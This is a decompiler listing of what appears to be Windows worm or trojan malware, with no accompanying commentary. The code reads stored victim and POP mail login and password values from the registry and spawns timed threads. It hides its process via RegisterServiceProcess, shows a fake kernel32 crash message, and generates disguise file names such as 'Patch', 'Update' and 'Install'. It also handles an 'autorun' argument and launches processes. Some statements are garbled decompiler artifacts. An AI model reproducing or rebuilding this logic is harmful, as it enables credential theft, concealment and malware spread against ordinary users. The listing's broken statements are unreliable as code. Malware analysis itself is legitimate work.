        _t28 = L0040679E();
        __esp = __esp + 16;
        __eflags = _t28;
        if(_t28 != 0) {
            _t39 = L0040679E(-2147483646, 4302344, "Server", 4302452);
            __eflags = _t39;
            if(_t39 != 0) {
                 *4302448 = 1;
            }
        }
        _push(4271928);
        _push("ZipName");
        _push(_t48);
        _push(_t45);
        L0040679E();
        _push(4271576);
        _push("VicName");
        _push(_t48);
        _push(_t45);
        L0040679E();
        _push( &_v180);
        _push("CacheBox Outfit");
        _push(_t48);
        _push(_t45);
        L0040679E();
        _t34 = L0040D680(0,  &_v180, "yes");
        __esp = __esp + 48;
        __eflags = _t34;
        if(_t34 == 0) {
             *4271628 = 1;
        }
        _push( &_v180);
        _push("Counter Visited");
        _push(_t48);
        _push(_t45);
        L0040679E();
        _t38 = L0040D680(0,  &_v180, "yes");
        __esp = __esp + 16;
        __eflags = _t38;
        if(_t38 == 0) {
             *4271924 = 1;
        }
        _t24 = L0040679E(_t45, _t48, "Login", 4271764);
        __eflags = _t24;
        if(_t24 != 0) {
            _t24 = L0040679E(_t45, _t48, "Pass", 4302240);
            __eflags = _t24;
            if(_t24 != 0) {
                _t24 = L0040679E(_t45, _t48, "POP Server", 4302128);
                __eflags = _t24;
                if(_t24 != 0) {
                    _t24 = L0040679E(_t45, _t48, "X-ID", 4271732);
                    __eflags = _t24;
                    if(_t24 != 0) {
                         *4302552 = 1;
                    }
                }
            }
        }
        __eflags =  *4302448;
        if( *4302448 == 0) {
L18:
            _v32 = 120000;
            goto L19;
        } else {
            __eflags =  *4271628;
            _v32 = 20000;
            if( *4271628 != 0) {
L19:
                _push(L00404CF5);
                _push(_v32);
                _push(0);
                _push(0);
                _t48 = __imp__SetTimer;
                 *_t48();
                 *4271864 = _t24;
                _push(L0040133B);
                _push(45000);
                _push(0);
                _push(0);
                 *_t48();
                 *4302232 = _t24;
                _push(0);
                _push(0);
                _push(0);
                _push(0);
                L0040133B();
                L00406A51();
                __eflags =  *4302448;
                if(__eflags != 0) {
                    _push(0);
                    _push(0);
                    _push(0);
                    _push(0);
                    L00404CF5(__edx);
                }
                _push(1);
                _pop(__eax);
                goto L3;
            }
            goto L18;
        }
    }
L3:
    _v8 = _v8 | -1;
    goto L23;
}

L00404CF5(
    _unknown_ __edx                        // r3
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v32;                             // _cfa_ffffffe0
    signed int _v36;                       // _cfa_ffffffdc
    _unknown_ __ebx;                       // r1
    intOrPtr __edi;                        // r4
    _unknown_ __esi;                       // r5
    char* _t15;                            // _t15
    signed int _t20;                       // _t20
    _unknown_ _t25;                        // _t25

    _push(-1);
    _push(4252640);
    _push(4236164);
    _t15 =  *fs:0x0];
    _push(_t15);
     *fs:0x0] = __esp;
    __esp = __esp - 16;
    _push(__ebx);
    _push(_t25);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    if( *4302236 != 0) {
L19:
        _v8 = _v8 | -1;
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return _t15;
    }
    if( *4271628 != 0) {
        if( *4302448 != 0) {
            _t15 = L00406F04();
            if(_t15 == 0) {
                goto L19;
            }
            _v36 = 0;
            _push(1);
            _pop(__edi);
            if( *4271924 == 0) {
                 *4302236 = __edi;
                if(L0040436A(_t20, __edx) != 0) {
                    L004066EB(-2147483646, 4302344, "Counter Visited", __edi, "yes");
                }
                 *4271924 = __edi;
                 *4302236 = 0;
            }
            if( *4302552 == 0) {
L16:
                _v36 = 4202029;
                goto L17;
            } else {
                _push(20);
                _pop(__ecx);
                _v36 = 4212230;
                if( *4302340 % _t20 == 0) {
L17:
                     *4302340 =  *4302340 + 1;
                     *4302236 = __edi;
                    _t15 =  &_v32;
                    _push( &_v32);
                    _push(0);
                    _push(0);
                    _push(_v36);
                    _push(0);
                    _push(0);
                    __imp__CreateThread();
                     *4271868 =  &_v32;
                    if( &_v32 == 0) {
L5:
                         *4302236 = 0;
                        goto L19;
                    }
                    _push( &_v32);
                    __imp__CloseHandle();
                    goto L19;
                }
                goto L16;
            }
        }
         *4302236 = 1;
        _push(0);
        _push(4214414);
        _push(0);
        _push(101);
        _push( *4302228);
        __imp__DialogBoxParamA();
        if( *4302448 != 0) {
            _push(L00404CF5);
            _push(20000);
            _push( *4271864);
            _push(0);
            __imp__SetTimer();
        }
        goto L19;
    }
     *4302236 = 1;
    _t15 = L0040772C(0);
    if( *4271628 != 0 &&  *4302448 != 0) {
        _push(L00404CF5);
        _push(20000);
        _push( *4271864);
        _push(0);
        __imp__SetTimer();
    }
    goto L5;
}

L004066EB(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12,                         // _cfa_c
    intOrPtr _a16,                         // _cfa_10
    intOrPtr _a20                          // _cfa_14
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    char _v36;                             // _cfa_ffffffdc
    char _v40;                             // _cfa_ffffffd8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    char* _t24;                            // _t24
    _unknown_ _t25;                        // _t25

    _push(-1);
    _push(4252816);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 20;
    _push(__ebx);
    _push(_t25);
    _push(__edi);
    _v28 = __esp;
    _v36 = 0;
    _v8 = 0;
    _push( &_v40);
    _t24 =  &_v36;
    _push( &_v36);
    _push(0);
    _push(2);
    _push(0);
    _push(0);
    _push(0);
    _push(_a8);
    _push(_a4);
    __imp__RegCreateKeyExA();
    if(_v36 != 0) {
        if(_a16 != 4) {
            _push(_a20);
            __imp__lstrlenA();
            _push( &_v36);
            _push(_a20);
            _push(_a16);
        } else {
            _push(4);
            _push(_a20);
            _push(4);
        }
        _push(0);
        _push(_a12);
        _push(_v36);
        __imp__RegSetValueExA();
        _v32 = _t24;
        _push(_v36);
        __imp__RegCloseKey();
        if(_v32 != 0) {
            goto L1;
        } else {
            _push(1);
            _pop(__eax);
        }
    } else {
L1:
        _t24 = 0;
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t24;
}

L0040679E(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12,                         // _cfa_c
    char* _a16                             // _cfa_10
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v32;                             // _cfa_ffffffe0
    char* _v36;                            // _cfa_ffffffdc
    char _v40;                             // _cfa_ffffffd8
    char _v44;                             // _cfa_ffffffd4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    char* _t23;                            // _t23
    _unknown_ _t24;                        // _t24
    _unknown_ _t26;                        // _t26
    char* _t27;                            // _t27

    _push(-1);
    _push(4252832);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 24;
    _push(_t24);
    _push(_t26);
    _push(__edi);
    _v28 = __esp;
    _v44 = 0;
    _v40 = 100;
    _v8 = 0;
    _t27 = _a16;
     *_t27 = 0;
    _push( &_v44);
    _push(1);
    _push(0);
    _push(_a8);
    _push(_a4);
    __imp__RegOpenKeyExA();
    if(_v44 != 0) {
        _push( &_v40);
        _push(_t27);
        _t23 =  &_v32;
        _push( &_v32);
        _push(0);
        _push(_a12);
        _push(_v44);
        __imp__RegQueryValueExA();
        _v36 =  &_v32;
        _push(_v44);
        __imp__RegCloseKey();
        if(_v36 != 0) {
            goto L1;
        } else {
            _push(1);
            _pop(__eax);
            goto L2;
        }
L6:
    } else {
L1:
        _t23 = 0;
    }
L2:
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t23;
    goto L6;
}

L00406840(
    _unknown_ _a4                          // _cfa_4
)
{
    _unknown_ _t2;                         // _t2

    _t2 = L00406850(100);
    asm("sbb eax, eax");
    return _t2 + 1;
}

signed int L00406850(
    signed int _a4                         // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t16;                         // _t16
    signed int _t17;                       // _t17
    signed int _t20;                       // _t20
    _unknown_ _t32;                        // _t32
    signed int _t33;                       // _t33
    _unknown_ _t34;                        // _t34

    _push(-1);
    _push(4252848);
    _push(4236164);
    _t16 =  *fs:0x0];
    _push(_t16);
     *fs:0x0] = __esp;
    __esp = __esp - 12;
    _push(__ebx);
    _push(_t34);
    _push(_t32);
    _v28 = __esp;
    _t24 = 0;
    _v8 = 0;
    _t33 = _a4;
    if(_t33 > 0) {
        __imp__GetTickCount();
        _t35 = _t16;
        _v32 = _t35;
        if(_t35 !=  *4302884) {
            L0040AD6C(_t35);
             *4302884 = _t35;
        }
        if(_t33 >= 32768) {
            _t17 = L0040AD79();
            _t35 = 32767;
            _t24 = _t17 * _t33 / 32767;
        } else {
            _t17 * _t33 / 32767 = L0040AD79() % _t33 + 1;
        }
    }
    _v8 = _v8 | -1;
    _t20 = _t24;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t20;
}

L004068F4(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    signed int _v32;                       // _cfa_ffffffe0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t19;                        // _t19
    _unknown_ _t23;                        // _t23
    intOrPtr _t24;                         // _t24
    _unknown_ _t25;                        // _t25
    intOrPtr _t26;                         // _t26

    _push(-1);
    _push(4252864);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 12;
    _push(_t19);
    _push(_t25);
    _push(_t23);
    _v28 = __esp;
    _v8 = 0;
    _v32 = 0;
    _t24 = _a8;
    _t26 = _a4;
    while(_v32 < _t24) {
         *((char*)(_v32 + _t26)) = L00406850(26) + 96;
        _v32 = _v32 + 1;
    }
     *((char*)(_t26 + _t24)) = 0;
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t26;
}

L0040696B(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    signed int _v32;                       // _cfa_ffffffe0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t19;                        // _t19
    _unknown_ _t23;                        // _t23
    intOrPtr _t24;                         // _t24
    _unknown_ _t25;                        // _t25
    intOrPtr _t26;                         // _t26

    _push(-1);
    _push(4252880);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 12;
    _push(_t19);
    _push(_t25);
    _push(_t23);
    _v28 = __esp;
    _v8 = 0;
    _v32 = 0;
    _t24 = _a8;
    _t26 = _a4;
    while(_v32 < _t24) {
         *((char*)(_v32 + _t26)) = L00406850(9) + 48;
        _v32 = _v32 + 1;
    }
     *((char*)(_t26 + _t24)) = 0;
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t26;
}

L004069E2(
    _unknown_ __edx                        // r3
)
{
    char _v16;                             // _cfa_fffffff0
    char _v116;                            // _cfa_ffffff8c

    __edx = __edx;
    _push("Memory access violation in module kernel32 at ");
    _push( &_v116);
    L0040A0F0(__edx);
    _push(4);
    _push( &_v16);
    _push(L0040696B());
    _push( &_v116);
    L0040A100( &_v116);
    _push(":");
    _push( &_v116);
    L0040A100( &_v116);
    L0040A100( &_v16, 8);
    __esp = __esp + 32;
    _push(16);
    _push("Error occurred");
    _push( &_v116);
    _push(0);
    __imp__MessageBoxA();
    _push(1200);
    __imp__Sleep();
    return  &_v116;
}

L00406A51()
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr* _v32;                        // _cfa_ffffffe0
    intOrPtr* _v36;                        // _cfa_ffffffdc
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t8;                         // _t8

    _push(-1);
    _push(4252896);
    _push(4236164);
    __eax =  *fs:0x0];
    _push(__eax);
     *fs:0x0] = __esp;
    __esp = __esp - 16;
    _push(__ebx);
    _push(_t8);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    if( *4302444 != 0) {
        _push("kernel32.dll");
        __imp__GetModuleHandleA();
        _v32 = __eax;
        if(__eax != 0) {
            _push("RegisterServiceProcess");
            _push(__eax);
            __imp__GetProcAddress();
            _v36 = __eax;
            if(__eax != 0) {
                _push(1);
                _push(0);
                 *__eax();
            }
        }
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
}

L00406ACA(
    _unknown_ __eax,                       // r0
    _unknown_ __ebx,                       // r1
    _unknown_ __edi,                       // r4
    _unknown_ __esi                        // r5
)
{
    _unknown_ _t1;                         // _t1

    __esi = __esi;
    __edi = __edi;
    __ebx = __ebx;
    __eax = __eax;
    _push(_t1);
    _push(__ebx);
    _push(__esi);
    _push(__edi);
    _push(4221661);
    _push(4221665);
    return __eax;
}

L00406AFD(
    char* _a4                              // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t30;                         // _t30
    signed int _t31;                       // _t31
    char _t33;                             // _t33
    char _t34;                             // _t34
    _unknown_ _t41;                        // _t41
    intOrPtr _t42;                         // _t42
    _unknown_ _t43;                        // _t43
    char* _t44;                            // _t44

    _push(-1);
    _push(4252912);
    _push(4236164);
    _t30 =  *fs:0x0];
    _push(_t30);
     *fs:0x0] = __esp;
    __esp = __esp - 16;
    _push(__ebx);
    _push(_t43);
    _push(_t41);
    _v28 = __esp;
    _v8 = 0;
    _t42 = __imp__GetTickCount;
     *_t42();
    _v32 = _t30;
    _t44 = _a4;
    _t31 =  *_t44;
    if(_t31 + 30 + _t31 * 2 == 327) {
L2:
        L0040A210(_t31, _t44);
        if(_t31 != 4) {
L14:
            _v8 = _v8 | -1;
            _t32 = 0;
L15:
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return;
        }
        _t33 = _t44[2];
        if(_t33 - 33 == 81 || _t33 == 92) {
            L00406ACA(_t33, __ebx, _t42, _t44);
            _t34 = _t44[1];
            if(_t34 - 12 == 105) {
L7:
                 *_t42();
                if(_t34 - _v32 >= 20) {
                    goto L14;
                }
                _t32 = _t44[3];
                if(_t32 + 20 == 121 || 0 == 113) {
                    _v36 = 0;
                    while(_v36 < 100) {
                        _push(5);
                        __imp__Sleep();
                        _v36 = _v36 + 1;
                    }
                    _v8 = _v8 | -1;
                    _push(1);
                    _pop(__eax);
                    goto L15;
                } else {
                    goto L14;
                }
            }
            _t34 = _t34 + -40;
            if(_t34 != 45) {
                goto L14;
            }
            goto L7;
        } else {
            goto L14;
        }
    }
    _t31 = _t31 + _t31 - 4;
    if(_t31 != 130) {
        goto L14;
    }
    goto L2;
}

L00406BE3(
    _unknown_ __edx,                       // r3
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v284;                            // _cfa_fffffee4
    char* _v288;                           // _cfa_fffffee0
    char _v840;                            // _cfa_fffffcb8
    char* _v844;                           // _cfa_fffffcb4
    char _v856;                            // _cfa_fffffca8
    char _v860;                            // _cfa_fffffca4
    char _v924;                            // _cfa_fffffc64
    char _v928;                            // _cfa_fffffc60
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    char* __esi;                           // r5
    char* _t38;                            // _t38
    _unknown_ _t42;                        // _t42
    _unknown_ _t45;                        // _t45
    _unknown_ _t49;                        // _t49
    _unknown_ _t53;                        // _t53
    _unknown_ _t56;                        // _t56
    signed int _t58;                       // _t58
    char* _t61;                            // _t61

    __edx = __edx;
    _push(-1);
    _push(4252928);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 908;
    _push(_t56);
    _push(__esi);
    _push(_t61);
    _v28 = __esp;
    _v8 = 0;
    _t38 = L0040A210( *fs:0x0], _a4);
    if(_t38 >= 4) {
        _push(34);
        _push(_a4);
        _t38 = L0040ACB0(_t58);
        _pop(__ecx);
        _pop(__ecx);
        __esi = _t38;
        _v844 = __esi;
        if(__esi == 0) {
L19:
            _v8 = _v8 | -1;
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return _t38;
        }
        __esi = __esi + 1;
        _v844 = __esi;
        _push(34);
        _push(__esi);
        _t38 = L0040ACB0(_t58);
        _pop(__ecx);
        _pop(__ecx);
        _t61 = _t38;
        _v288 = _t61;
        if(_t61 != 0 && _t61 != __esi) {
            _t56 = _t61 - __esi;
            _push(_t56);
            _push(__esi);
            _push( &_v284);
            L0040A460( &_v284);
             *((char*)(__ebp + _t56 - 280)) = 0;
            _t42 = L00401000(__edx,  &_v284, 1);
            __esp = __esp + 12;
            if(_t42 == 0) {
                _push( &_v840);
                _push( &_v284);
                _t45 = L004010E3(_t58);
                _pop(__ecx);
                _pop(__ecx);
                if(_v840 == 0) {
                    __esi = 0;
L11:
                    _v844 = _t61;
                    if(L0040A210(_t45, _t61) <= 2) {
                        _v844 = __esi;
L18:
                        _v928 = __esi;
                        _push(16);
                        _pop(__ecx);
                        _push(_t58 << 2);
                        _push(0);
                        _push( &_v924);
                        memset();
                        __esp = __esp + 12;
                        _v928 = 68;
                        _v860 = __esi;
                        _t61 =  &_v856;
                        asm("stosd");
                        asm("stosd");
                        asm("stosd");
                        _push( &_v860);
                        _t38 =  &_v928;
                        _push( &_v928);
                        _push(__esi);
                        _push(__esi);
                        _push(67108864);
                        _push(__esi);
                        _push(__esi);
                        _push(__esi);
                        _push(_a4);
                        _push(__esi);
                        __imp__CreateProcessA();
                        goto L1;
                    }
                    _t61 = _t61 + 2;
                    _v844 = _t61;
                    _push(__esi);
                    _push(_t61);
                    _t49 = L00401000(__edx);
                    _pop(__ecx);
                    _pop(__ecx);
                    if(_t49 != 0) {
                        goto L6;
                    }
                    _push(550);
                    _push( &_v840);
                    _push(__esi);
                    __imp__GetModuleFileNameA();
                    _push( &_v840);
                    _push( &_v284);
                    _t53 = L0040D680(_t58);
                    _pop(__ecx);
                    _pop(__ecx);
                    if(_t53 != 0) {
                        goto L18;
                    }
                    _push("autorun");
                    _push(_t61);
                    _t38 = L0040D680(_t58);
                    _pop(__ecx);
                    _pop(__ecx);
                    if(_t38 == 0) {
                        goto L19;
                    }
                    if(L00406AFD(_t61) == 0) {
                        goto L18;
                    }
                    _t38 = L00409A73(__edx);
                    goto L19;
                }
                __esi = 0;
                _push(0);
                _push( &_v840);
                _t45 = L00401000(__edx);
                _pop(__ecx);
                _pop(__ecx);
                if(_t45 == 0) {
                    goto L11;
                }
            }
L6:
            _t38 = L004069E2(__edx);
        }
        goto L19;
    }
L1:
    _push(1200);
    __imp__Sleep();
    goto L19;
}

L00406DCD(
    char* _a4                              // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    signed int _v32;                       // _cfa_ffffffe0
    signed int _v36;                       // _cfa_ffffffdc
    char _v44;                             // _cfa_ffffffd4
    intOrPtr _v48;                         // _cfa_ffffffd0
    char _v52;                             // _cfa_ffffffcc
    char _v152;                            // _cfa_ffffff68
    char _v156;                            // _cfa_ffffff64
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    char* _t40;                            // _t40
    _unknown_ _t41;                        // _t41
    _unknown_ _t42;                        // _t42
    _unknown_ _t45;                        // _t45
    intOrPtr _t48;                         // _t48
    _unknown_ _t51;                        // _t51
    char* _t52;                            // _t52
    _unknown_ _t53;                        // _t53
    char* _t54;                            // _t54

    _push(-1);
    _push(4252944);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 136;
    _push(_t45);
    _push(_t53);
    _push(_t51);
    _v28 = __esp;
    _v156 = 0;
    _v32 = 0;
    _v52 = 100;
    _v8 = 0;
    _t52 = _a4;
     *_t52 = 0;
    _push( &_v156);
    _push(9);
    _push(0);
    _t54 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer";
    _push(_t54);
    _push(-2147483646);
    __imp__RegOpenKeyExA();
    if(_v156 != 0) {
        while(1) {
            _push( &_v44);
            _push(0);
            _push(0);
            _push(0);
            _push( &_v52);
            _t40 =  &_v152;
            _push( &_v152);
            _push(_v32);
            _push(_v156);
            __imp__RegEnumKeyExA();
            if( &_v152 != 0) {
                break;
            }
            _v36 = 0;
            while(1) {
                _v48 = _t40;
                if(_t40 >= _v52) {
                    break;
                }
                _t48 =  *((intOrPtr*)(__ebp + _t40 - 148));
                if(_t48 < 65 || _t48 > 90) {
                    _v36 = 0;
                } else {
                    __edx = _v36;
                    _v36 = __edx + _t48 - 64;
                    _t40 = _t40 + 1;
                    continue;
                }
                break;
            }
            if(_v36 != 80) {
                _v32 = _v32 + 1;
                _v52 = 100;
                continue;
            } else {
                _push(_t54);
                _push(_t52);
                _t42 = L0040A0F0(__edx);
                _push("\\");
                _push(_t52);
                L0040A100(_t42);
                _t41 = L0040A100( &_v152, _t52,  &_v152);
                __esp = __esp + 16;
                _push(_v156);
                __imp__RegCloseKey();
                _push(1);
                _pop(__eax);
                goto L11;
            }
            goto L15;
        }
        _push(_v156);
        __imp__RegCloseKey();
        _v8 = _v8 | -1;
        _t41 = 0;
    } else {
        _t41 = 0;
L11:
        _v8 = _v8 | -1;
    }
L15:
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t41;
}

L00406F04()
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char* _v32;                            // _cfa_ffffffe0
    char _v36;                             // _cfa_ffffffdc
    intOrPtr _v40;                         // _cfa_ffffffd8
    intOrPtr _v44;                         // _cfa_ffffffd4
    char _v48;                             // _cfa_ffffffd0
    char _v52;                             // _cfa_ffffffcc
    char _v56;                             // _cfa_ffffffc8
    char _v60;                             // _cfa_ffffffc4
    intOrPtr _v64;                         // _cfa_ffffffc0
    intOrPtr _v68;                         // _cfa_ffffffbc
    intOrPtr _v72;                         // _cfa_ffffffb8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t34;                         // _t34
    char* _t38;                            // _t38
    _unknown_ _t39;                        // _t39
    _unknown_ _t41;                        // _t41
    intOrPtr _t42;                         // _t42
    _unknown_ _t43;                        // _t43
    intOrPtr* _t44;                        // _t44

    _push(-1);
    _push(4252960);
    _push(4236164);
    _t34 =  *fs:0x0];
    _push(_t34);
     *fs:0x0] = __esp;
    __esp = __esp - 52;
    _push(_t39);
    _push(_t43);
    _push(_t41);
    _v28 = __esp;
    _v36 = 0;
    _v8 = 0;
    _t44 = "wininet.dll";
    _push(_t44);
    __imp__GetModuleHandleA();
    _t42 = _t34;
    _v44 = _t42;
    if(_t42 != 0) {
L2:
        _push("InternetOpenA");
        _push(_t42);
        _t44 = __imp__GetProcAddress;
         *_t44();
        _v64 = _t34;
        _push("InternetGetConnectedState");
        _push(_t42);
         *_t44();
        _v72 = _t34;
        _push("InternetCloseHandle");
        _push(_t42);
         *_t44();
        _v68 = _t34;
        if(_v64 == 0 || _v72 == 0 || _t34 == 0) {
L9:
            _v52 = 0;
            _v60 = 4;
            _push( &_v56);
            _push(1);
            _push(0);
            _push("System\\CurrentControlSet\\Services\\RemoteAccess");
            _push(-2147483646);
            __imp__RegOpenKeyExA();
            _push( &_v60);
            _push( &_v52);
            _t38 =  &_v48;
            _push( &_v48);
            _push(0);
            _push("Remote Connection");
            _push(_v56);
            __imp__RegQueryValueExA();
            _push(_v56);
            __imp__RegCloseKey();
            if(_v52 == 0) {
                 *4302340 = 0;
                _t38 = 0;
            } else {
                _push(1);
                _pop(__eax);
            }
            _v8 = _v8 | -1;
            goto L13;
        } else {
            _push(536870912);
            _push(0);
            _push(0);
            _push(0);
            _push("Windows Explorer");
            _v64();
            _v40 = _t34;
            _push(0);
            _t38 =  &_v36;
            _push( &_v36);
            _v72();
            _v32 =  &_v36;
            if(_v40 != 0) {
                _push(_v40);
                _v68();
            }
            if(_v32 == 0) {
                goto L9;
            }
            _v8 = _v8 | -1;
            _push(1);
            _pop(__eax);
L13:
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return _t38;
        }
    }
    _push(_t44);
    __imp__LoadLibraryA();
    _t42 = _t34;
    _v44 = _t42;
    if(_t42 == 0) {
        goto L9;
    }
    goto L2;
}

L004073F8(
    char* _a4                              // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v40;                             // _cfa_ffffffd8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t13;                        // _t13
    _unknown_ _t14;                        // _t14
    char* _t15;                            // _t15
    _unknown_ _t17;                        // _t17
    _unknown_ _t25;                        // _t25
    _unknown_ _t27;                        // _t27
    _unknown_ _t28;                        // _t28
    char* _t29;                            // _t29
    _unknown_ _t31;                        // _t31
    char* _t32;                            // _t32
    _unknown_ _t34;                        // _t34
    signed int _t36;                       // _t36
    _unknown_ _t38;                        // _t38
    _unknown_ _t39;                        // _t39
    char* _t40;                            // _t40
    _unknown_ _t42;                        // _t42
    _unknown_ _t44;                        // _t44
    char* _t45;                            // _t45
    signed int _t47;                       // _t47
    _unknown_ _t48;                        // _t48
    _unknown_ _t51;                        // _t51
    _unknown_ _t53;                        // _t53
    char* _t54;                            // _t54

    _push(-1);
    _push(4252992);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 20;
    _push(__ebx);
    _push(_t53);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    _t54 = _a4;
     *_t54 = 0;
    _t13 = L00406850(4) - 1;
    if(_t13 == 0) {
        _t14 = L00406840(50);
        _t15 = "Q";
        if(_t14 == 0) {
            _t15 = "q";
        }
        _push(_t15);
        _push(_t54);
        L0040A100(_t15);
        _t17 = L00406840(20);
        __esp = __esp + 8;
        if(_t17 == 0) {
            L0040A100( &_v40, 6);
            goto L32;
        } else {
            _push(4);
            _push(L00406850());
            _push( &_v40);
            _t25 = L004068F4();
L16:
            L0040A100(_t25, _t54, _t25);
            __esp = __esp + 12;
L32:
            if(L00406840(15) != 0) {
                _push(_t54);
                __imp__CharUpperA();
            }
            _v8 = _v8 | -1;
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return _t54;
        }
    }
    _t27 = _t13 - 1;
    if(_t27 == 0) {
        _t28 = L00406840(50);
        _t29 = "P";
        if(_t28 == 0) {
            _t29 = "p";
        }
        _push(_t29);
        _push(_t54);
        L0040A100(_t29);
        _t31 = L00406840(50);
        __esp = __esp + 8;
        _t32 = "atch";
        if(_t31 == 0) {
            _t32 = "ack";
        }
L25:
        _push(_t32);
        _push(_t54);
        L0040A100(_t32);
        _t34 = L00406840(75);
        __esp = __esp + 8;
        if(_t34 == 0) {
            goto L32;
        }
        _push(3);
        _t36 = L00406850() + 1;
L15:
        _push(_t36);
        _push( &_v40);
        _t25 = L0040696B();
        goto L16;
    }
    _t38 = _t27 - 1;
    if(_t38 == 0) {
        _t39 = L00406840(50);
        _t40 = "U";
        if(_t39 == 0) {
            _t40 = "u";
        }
        _push(_t40);
        _push(_t54);
        L0040A100(_t40);
        _t42 = L00406840(50);
        __esp = __esp + 8;
        _t32 = "pdate";
        if(_t42 == 0) {
            _t32 = "pgrade";
        }
        goto L25;
    }
    if(_t38 != 1) {
        goto L32;
    }
    _t44 = L00406840(50);
    _t45 = "I";
    if(_t44 == 0) {
        _t45 = "i";
    }
    _push(_t45);
    _push(_t54);
    L0040A100(_t45);
    _t47 = L00406850(3);
    __esp = __esp + 8;
    _t48 = _t47 - 1;
